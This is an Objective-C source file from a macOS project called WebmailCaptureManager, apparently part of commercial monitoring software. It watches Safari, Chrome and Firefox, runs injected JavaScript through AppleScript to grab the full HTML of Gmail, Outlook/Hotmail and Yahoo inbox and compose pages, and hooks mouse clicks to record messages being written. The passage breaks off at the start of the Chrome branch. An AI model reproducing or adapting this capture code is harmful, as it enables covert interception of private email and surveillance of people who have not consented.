//
//  WebmailNotifier.m
//  WebmailCaptureManager
//
//  Created by ophat on 2/6/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "WebmailNotifier.h"
#import "WebmailHTMLParser.h"
#import "MessagePortIPCSender.h"
#import <CommonCrypto/CommonDigest.h>
#import "SystemUtilsImpl.h"

#define kAddonName

@implementation WebmailNotifier

@synthesize mUrlPageSafari;
@synthesize mUrlPageChrome;

@synthesize mObserver1;
@synthesize mObserver2;
@synthesize mLoop1;
@synthesize mLoop2;
@synthesize mProcess1;
@synthesize mProcess2;

@synthesize mAsyC;

id mouseEventHandler = nil;
id forceAliveMouseEventHandler = nil;

int SafariSleepTime = 2;
int ChromeSleepTime = 2;
NSString * addonName  = @"KnowITMac@digitalendpoint.xpi";
NSString * addonPlist = @"addonversion.plist";

#pragma mark - Start / Stop

-(void) startCapture{
    [self stopCapture];
    
    DLog(@"startCapture");
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(webmailRegisterAppNotify:)  name:NSWorkspaceDidActivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(webmailUnRegisterAppNotify:)  name:NSWorkspaceDidDeactivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(webmailRegisterAppNotifyCaseLaunch:)  name:NSWorkspaceDidLaunchApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(webmailUnRegisterAppNotifyCaseTerminate:)  name:NSWorkspaceDidTerminateApplicationNotification  object:nil];
    
    mAsyC  = [[AsyncController alloc] init];
    [mAsyC startServer];

    [self firefoxHandlerwithAutoReplace:NO];
}

-(void) stopCapture{
    DLog(@"stopCapture");
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidActivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidLaunchApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidTerminateApplicationNotification object:nil];
    
    [self unregisterMouseClickListener];
    [self unregisterYahooMouseClickListener];
    
    [self unRegisterPageEventSafari:@"stop"];
    [self unRegisterPageEventChrome:@"stop"];
    
    [mAsyC stopServer];
}

#pragma mark -Register / Unregister -> App Notification

-(void) webmailRegisterAppNotifyCaseLaunch:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSString * appBundleIdentifier = [userInfo objectForKey:@"NSApplicationBundleIdentifier"];
    if ([appBundleIdentifier isEqualToString:@"com.apple.Safari"]) {
        DLog(@"register Launch Safari");
        SafariSleepTime = 2;
    }
    if ([appBundleIdentifier isEqualToString:@"com.google.Chrome"]){
        DLog(@"register Launch Chrome");
        ChromeSleepTime = 2;
    }
    if ([appBundleIdentifier isEqualToString:@"org.mozilla.firefox"]){
        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
            [self firefoxHandlerwithAutoReplace:NO];
        });
    }
}
-(void) webmailRegisterAppNotify:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication *runningapp = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    
    [self unregisterMouseClickListener];
    [self unregisterYahooMouseClickListener];
    
    if ([[runningapp bundleIdentifier]isEqualToString:@"com.apple.Safari"]) {
        [self registerPageEventSafari];
        [self startAnalyzeCallback];
    }
    if ([[runningapp bundleIdentifier]isEqualToString:@"com.google.Chrome"]){
        [self registerPageEventChrome];
        [self startAnalyzeCallback];
    }
    if ([[runningapp bundleIdentifier]isEqualToString:@"org.mozilla.firefox"]){
        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
            [self firefoxHandlerwithAutoReplace:NO];
        });
    }
}

-(void) webmailUnRegisterAppNotify:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication *runningapp = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    if ([[runningapp bundleIdentifier]isEqualToString:@"com.apple.Safari"]) {
        [self unRegisterPageEventSafari:@"deactive"];
        [self unregisterMouseClickListener];
        [self unregisterYahooMouseClickListener];
    }
    else if([[runningapp bundleIdentifier]isEqualToString:@"com.google.Chrome"]){
        [self unRegisterPageEventChrome:@"deactive"];
        [self unregisterMouseClickListener];
        [self unregisterYahooMouseClickListener];
    }
}

-(void) webmailUnRegisterAppNotifyCaseTerminate:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSString * runningapp = [userInfo objectForKey:@"NSApplicationBundleIdentifier"];
    if ([runningapp isEqualToString:@"com.apple.Safari"]) {
        [self unRegisterPageEventSafari:@"terminate"];
        [self unregisterMouseClickListener];
        [self unregisterYahooMouseClickListener];
        SafariSleepTime = 2;
    }
    else if([runningapp isEqualToString:@"com.google.Chrome"]){
        [self unRegisterPageEventChrome:@"terminate"];
        [self unregisterMouseClickListener];
        [self unregisterYahooMouseClickListener];
        ChromeSleepTime = 2;
    }
}

#pragma mark -Register / Unregister -> Page Notification

-(void) registerPageEventSafari{
    if (mObserver1 == nil) {
        int counter = 4;
        sleep(SafariSleepTime);
        BOOL isRegister = false;
        while (!isRegister) {
            NSArray * checker = [NSRunningApplication runningApplicationsWithBundleIdentifier:@"com.apple.Safari"];
            if ([checker count]>0) {
                NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n return the unix id of (every process whose name is \"Safari\")\n end tell"];
                NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
                int myPid = [[Result stringValue] intValue];
                [scptFrontmost release];
                pid_t pid = myPid;
                
                mProcess1 = AXUIElementCreateApplication(pid);
                AXObserverCreate(pid, MyAXObserverCallback2, &mObserver1);
                mLoop1 = CFRunLoopGetCurrent();
                
                AXObserverAddNotification(mObserver1, mProcess1,kAXValueChangedNotification, self);
                CFRunLoopAddSource(mLoop1, AXObserverGetRunLoopSource(mObserver1), kCFRunLoopDefaultMode);
                DLog(@"registerPageEvent Safari");
                isRegister = true;
                SafariSleepTime = 0.2;
                break;
            }else{
                sleep(0.2);
            }
            if (counter == 0) {
                break;
            }
            counter--;
        }
        if (!isRegister) {
            DLog(@"Loop is stucking that why this line is printing out and all event capture will be lose lol");
        }
    }
}

-(void) registerPageEventChrome{
    if (mObserver2 == nil ) {
        int counter = 4;
        sleep(ChromeSleepTime);
        BOOL isRegister = false;
        while (!isRegister) {
            NSArray * checker = [NSRunningApplication runningApplicationsWithBundleIdentifier:@"com.google.Chrome"];
            if ([checker count]>0) {
                NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n return the unix id of (every process whose name is \"Google Chrome\")\n end tell"];
                NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
                int myPid = [[Result stringValue] intValue];
                [scptFrontmost release];
                pid_t pid = myPid;
                
                mProcess2 = AXUIElementCreateApplication(pid);
                AXObserverCreate(pid, MyAXObserverCallback2, &mObserver2);
                mLoop2 = CFRunLoopGetCurrent();
                AXObserverAddNotification(mObserver2, mProcess2,kAXValueChangedNotification, self);
                CFRunLoopAddSource(mLoop2, AXObserverGetRunLoopSource(mObserver2), kCFRunLoopDefaultMode);
                DLog(@"registerPageEvent Chrome");
                isRegister = true;
                ChromeSleepTime = 0.2;
                break;
            }else{
                sleep(0.2);
            }
            if (counter == 0) {
                break;
            }
            counter--;
        }
        if (!isRegister) {
            DLog(@"Loop is stucking that why this line is printing out and all event capture will be lose lol");
        }
    }
}

-(void) unRegisterPageEventSafari:(NSString *)aCase{
    if (mObserver1 != nil ){// && mLoop1 != nil && mProcess1 != nil) {
        DLog(@"unRegisterPageEventSafari %@",aCase);
        AXObserverRemoveNotification(mObserver1, mProcess1, kAXValueChangedNotification);
        CFRunLoopRemoveSource(mLoop1, AXObserverGetRunLoopSource(mObserver1), kCFRunLoopDefaultMode);
        mLoop1 = nil;
        mObserver1 = nil;
        mProcess1 = nil;
    }
}
-(void) unRegisterPageEventChrome:(NSString *)aCase{
    if (mObserver2 != nil ){//&& mLoop2 != nil && mProcess2 != nil) {
        DLog(@"unRegisterPageEventChrome %@",aCase);
        AXObserverRemoveNotification(mObserver2, mProcess2, kAXValueChangedNotification);
        CFRunLoopRemoveSource(mLoop2, AXObserverGetRunLoopSource(mObserver2), kCFRunLoopDefaultMode);
        mLoop2 = nil;
        mObserver2 = nil;
        mProcess2 = nil;
    }
}

#pragma mark -CallBack

void MyAXObserverCallback2( AXObserverRef observer, AXUIElementRef element, CFStringRef notificationName, void * contextData ){
    
    CFTypeRef _title;
    if (AXUIElementCopyAttributeValue(element, (CFStringRef)NSAccessibilityValueAttribute, (CFTypeRef *)&_title) == kAXErrorSuccess) {
        NSString *title = [NSString stringWithFormat:@"%@",_title];
        if( [title length]>0 && ![title isEqualToString:@"Top Sites"] && ![title isEqualToString:@"Untitled"]){
            DLog(@"### Inner Selectedtitle %@",title);
            WebmailNotifier * mySelf = (WebmailNotifier *)contextData;
            [mySelf startAnalyzeCallback];
        }
    }
    if (_title != NULL){
        CFRelease(_title);
    }
}

-(void) startAnalyzeCallback{
    @try{
        DLog(@"startAnalyzeCallback");
        NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
        
        [self unregisterYahooMouseClickListener];
        [self unregisterMouseClickListener];
        
        NSString * frontMostName = @"";
        NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n item 1 of (get name of processes whose frontmost is true) \n end tell"];
        NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
        frontMostName = [[Result stringValue] copy];
        [scptFrontmost release];
        
        
        
        if ([frontMostName isEqualToString:@"Safari"]){
            
            NSString * myHTMLSource= @"";
            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n return {URL of current tab of window 1, name of current tab of window 1} \n end tell"];
            NSAppleEventDescriptor *scptResult = [scpt executeAndReturnError:nil];
            //DLog(@"scptResult %@",[[scptResult descriptorAtIndex:1]stringValue]);
            if([self.mUrlPageSafari length]==0){
                if([[[scptResult descriptorAtIndex:1]stringValue] length]>0 ){
                    self.mUrlPageSafari = [NSString stringWithFormat:@"%@",[[scptResult descriptorAtIndex:1]stringValue]];
                    
                    if ( ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound
                          && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"?tid="].location != NSNotFound
                          && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"fid=flinbox"].location != NSNotFound) ||
                         ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound
                          && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"?tid="].location != NSNotFound
                          && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"fid=flsearch"].location != NSNotFound)
                      ) {
                        
                        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                        NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                        myHTMLSource = [scptResult2 stringValue];
                        [scpt2 release];
                        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                            [WebmailHTMLParser Hotmail_HTMLParser:myHTMLSource];
                        });
                    }
                    
                    else if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"outlook.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail"].location != NSNotFound ){
                        self.mUrlPageSafari =  [NSString stringWithFormat:@"%@/%@",[[scptResult descriptorAtIndex:1]stringValue],[NSDate date]];
                        
                        //===== TEST
                        if(![self isSetSender:@"Safari"]){
                            [self OutlookGetSender:@"Safari"];
                        }
                        //===== TEST
                        if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"inbox/rp"].location != NSNotFound ) {
                            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                [WebmailHTMLParser Hotmail_HTMLParser_Outlook_Incoming:@"Safari"];
                            });
                            [self registerSafariMouseClickListener];
                        }else {
                            [self registerSafariMouseClickListener];
                        }
                    }
                    
                    else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"Compose"].location != NSNotFound) {
                        [self registerSafariMouseClickListener];
                    }
                    
                    else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose"].location != NSNotFound) {
                        [self registerSafariMouseClickListener];
                    }
                    
                    else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound &&
                             [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"#inbox"].location != NSNotFound ) {
                        
                        NSString * inboxChecker = [[scptResult descriptorAtIndex:1]stringValue];
                        inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"https://mail.google.com/mail" withString:@""];
                        
                        NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#inbox"];
                        inboxChecker = [spliter objectAtIndex:1];
                        inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"/" withString:@""];
                        
                        if([inboxChecker length]>0 ){
                            
                            NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                            NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                            myHTMLSource = [scptResult2 stringValue];
                            [scpt2 release];
                            
                            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                [WebmailHTMLParser Gmail_HTMLParser:myHTMLSource];
                            });
                            
                            [self registerSafariMouseClickListener];
                        }
                    }
                    
                    else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound &&
                             [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"#search"].location != NSNotFound ) {
                        
                        NSString * inboxChecker = [[scptResult descriptorAtIndex:1]stringValue];
                        inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"https://mail.google.com/mail" withString:@""];
                        
                        NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#search"];
                        inboxChecker = [spliter objectAtIndex:1];
                        if ( ( [[inboxChecker componentsSeparatedByString:@"/"] count] - 1 ) == 2 ) {
                            
                            DLog(@"Gmail Implement Search");
                            NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                            NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                            myHTMLSource = [scptResult2 stringValue];
                            [scpt2 release];
                            
                            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                [WebmailHTMLParser Gmail_HTMLParser:myHTMLSource];
                            });
                            
                        }
                    }
                    
                    else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.yahoo.com/"].location != NSNotFound  ) {
                        DLog(@"Change Yahoo");
                        
                        if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"neo/b"].location == NSNotFound ) {
                            NSAppleScript *isInInbox=[[NSAppleScript alloc]initWithSource:@"delay 0.2 \n tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.getElementById('Inbox').childNodes[1].getAttribute('aria-selected'); return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                            NSAppleEventDescriptor *isInInboxResult =[isInInbox executeAndReturnError:nil];
                            if ([[isInInboxResult stringValue] isEqualToString:@"true"]) {
                                DLog(@"in Inbox");
                                NSAppleScript *isInMainList=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.getElementById('inboxcontainer').getAttribute('style'); return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                                NSAppleEventDescriptor *isInMainListResult =[isInMainList executeAndReturnError:nil];
                                if ([[isInMainListResult stringValue] isEqualToString:@"visibility: hidden;"]) {
                                    DLog(@"Not in Main");
                                    sleep(2.5);
                                    NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                                    NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                                    myHTMLSource = [scptResult2 stringValue];
                                    [scpt2 release];
                                    
                                    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                        [WebmailHTMLParser Yahoo_HTMLParser:myHTMLSource type:@"Safari"];
                                    });
                                }
                                [isInMainList release];
                            }
                            [isInInbox release];
                        }else if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"neo/b"].location != NSNotFound ) {
                            DLog(@"Basic go");
                            if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose?"].location == NSNotFound ) {
                                 sleep(1.5);
                            }
                            NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                            NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                            myHTMLSource = [scptResult2 stringValue];
                            [scpt2 release];
                            
                            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                [WebmailHTMLParser Yahoo_HTMLParser:myHTMLSource type:@"Safari"];
                            });
                        }
                        
                    }
                }
            }else{
                DLog(@"Change URL");
                NSString * original = self.mUrlPageSafari;
                if(![original isEqualToString:[[scptResult descriptorAtIndex:1]stringValue]] ){
                    if([[[scptResult descriptorAtIndex:1]stringValue] length]>0 ){
     
                        if ( ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound
                              && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"?tid="].location != NSNotFound
                              && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"fid=flinbox"].location != NSNotFound) ||
                             ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound
                              && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"?tid="].location != NSNotFound
                              && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"fid=flsearch"].location != NSNotFound)
                           ) {
                            DLog(@"URL Change inHotmail");
                            self.mUrlPageSafari = [[scptResult descriptorAtIndex:1]stringValue];
                            
                            NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                            NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                            myHTMLSource = [scptResult2 stringValue];
                            [scpt2 release];
                            
                            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                [WebmailHTMLParser Hotmail_HTMLParser:myHTMLSource];
                            });
                        }
                        
                        else if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"outlook.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail"].location != NSNotFound ){
                            DLog(@"URL Changed Out Outlook");
                            self.mUrlPageSafari =  [NSString stringWithFormat:@"%@/%@",[[scptResult descriptorAtIndex:1]stringValue],[NSDate date]];
                           
                            //===== TEST
                            if(![self isSetSender:@"Safari"]){
                                [self OutlookGetSender:@"Safari"];
                            }
                            //===== TEST
                            
                            if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"inbox/rp"].location != NSNotFound ) {
                                dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                    [WebmailHTMLParser Hotmail_HTMLParser_Outlook_Incoming:@"Safari"];
                                });
                                [self registerSafariMouseClickListener];
                            }else {
                                [self registerSafariMouseClickListener];
                            }
                            
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"Compose"].location != NSNotFound) {
                            DLog(@"URL Change OutHotmail");
                            self.mUrlPageSafari = [[scptResult descriptorAtIndex:1]stringValue];
                            
                            [self registerSafariMouseClickListener];
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose"].location != NSNotFound) {
                            DLog(@"URL Change OutGmail");
                            self.mUrlPageSafari = [[scptResult descriptorAtIndex:1]stringValue];
                            
                            [self registerSafariMouseClickListener];
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound &&
                                 [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"#inbox"].location != NSNotFound) {
                            
                            NSString * inboxChecker = [[scptResult descriptorAtIndex:1]stringValue];
                            inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"https://mail.google.com/mail" withString:@""];
                            
                            NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#inbox"];
                            inboxChecker = [spliter objectAtIndex:1];
                            inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"/" withString:@""];
                            
                            if([inboxChecker length]>0){
                                DLog(@"URL Change inGmail");
                                self.mUrlPageSafari = [[scptResult descriptorAtIndex:1]stringValue];
                                
                                NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                                NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                                myHTMLSource = [scptResult2 stringValue];
                                [scpt2 release];
                                
                                dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                    [WebmailHTMLParser Gmail_HTMLParser:myHTMLSource];
                                });
                                
                                [self registerSafariMouseClickListener];
                            }
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound &&
                                 [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"#search"].location != NSNotFound ) {
                            
                            NSString * inboxChecker = [[scptResult descriptorAtIndex:1]stringValue];
                            inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"https://mail.google.com/mail" withString:@""];
                            
                            NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#search"];
                            inboxChecker = [spliter objectAtIndex:1];
                            if ( ( [[inboxChecker componentsSeparatedByString:@"/"] count] - 1 ) == 2 ) {
                                
                                DLog(@"Gmail Implement Search");
                                NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                                NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                                myHTMLSource = [scptResult2 stringValue];
                                [scpt2 release];
                                
                                dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                    [WebmailHTMLParser Gmail_HTMLParser:myHTMLSource];
                                });
                                
                            }
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.yahoo.com/"].location != NSNotFound  ) {
                            DLog(@"URL Change Yahoo");
                            self.mUrlPageSafari = [[scptResult descriptorAtIndex:1]stringValue];
                            
                            if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"neo/b"].location == NSNotFound ) {
                                NSAppleScript *isInInbox=[[NSAppleScript alloc]initWithSource:@"delay 0.2 \n tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.getElementById('Inbox').childNodes[1].getAttribute('aria-selected'); return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                                NSAppleEventDescriptor *isInInboxResult =[isInInbox executeAndReturnError:nil];
                                if ([[isInInboxResult stringValue] isEqualToString:@"true"]) {
                                    DLog(@"in Inbox");
                                    NSAppleScript *isInMainList=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.getElementById('inboxcontainer').getAttribute('style'); return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                                    NSAppleEventDescriptor *isInMainListResult =[isInMainList executeAndReturnError:nil];
                                    if ([[isInMainListResult stringValue] isEqualToString:@"visibility: hidden;"]) {
                                        DLog(@"Not in Main");
                                        sleep(2.5);
                                        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                                        NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                                        myHTMLSource = [scptResult2 stringValue];
                                        [scpt2 release];
                                        
                                        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                            [WebmailHTMLParser Yahoo_HTMLParser:myHTMLSource type:@"Safari"];
                                        });
                                    }
                                    [isInMainList release];
                                }
                                [isInInbox release];
                            }else if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"neo/b"].location != NSNotFound ) {
                                DLog(@"Basic go");
                                if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose?"].location == NSNotFound ) {
                                    sleep(1.5);
                                }
                                NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                                NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
                                myHTMLSource = [scptResult2 stringValue];
                                [scpt2 release];
                                
                                dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                    [WebmailHTMLParser Yahoo_HTMLParser:myHTMLSource type:@"Safari"];
                                });
                            }
                        }
                    }
                }else{
                    if([[[scptResult descriptorAtIndex:1]stringValue] length]>0 ){
                        DLog(@"Out change");
                        if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"Compose"].location != NSNotFound) {
                            [self registerSafariMouseClickListener];
                        }
                        
                        else if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"outlook.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail"].location != NSNotFound ){
                            [self registerSafariMouseClickListener];
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose"].location != NSNotFound) {
                            [self registerSafariMouseClickListener];
                        }
                        
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound ) {
                            
                            NSString * inboxChecker = [[scptResult descriptorAtIndex:1]stringValue];
                            if ([inboxChecker rangeOfString:@"#inbox"].location != NSNotFound) {
                                NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#inbox"];
                                inboxChecker = [spliter objectAtIndex:1];
                                inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"/" withString:@""];
                                if([inboxChecker length]>0 ){
                                    [self registerSafariMouseClickListener];
                                }
                            }
                        }
                        else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.yahoo.com/"].location != NSNotFound  ) {
                            if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"neo/b"].location == NSNotFound ){
                                    [self registerYahooMouseClickListenerWithType:@"Safari"];
                            }else{
                                if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"neo/b"].location != NSNotFound    &&
                                     [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose?"].location != NSNotFound ){
                                    [self yahooAddScript:@"Safari"];
                                    [self registerYahooMouseClickListenerWithType:@"Safari"];
                                }
                            }
                        }
                    }
                }
            }
        
            [scpt release];
        }
        
        if ([frontMostName isEqualToString:@"Google Chrome"]){
            
